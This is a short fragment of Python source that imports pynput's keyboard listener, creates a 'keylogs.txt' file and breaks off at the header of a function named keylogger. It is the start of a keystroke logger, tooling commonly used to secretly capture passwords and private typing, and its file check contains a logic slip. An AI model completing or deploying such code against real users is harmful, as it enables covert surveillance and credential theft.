import os
from datetime import datetime
from pynput import keyboard 

# Ensure file exists and has correct permissions
if not (os.path.exists("keylogs.txt") or os.access("keylogs.txt", os.W_OK)):   
    open("keylogs.txt", 'w').close() 

def keylogger(key):
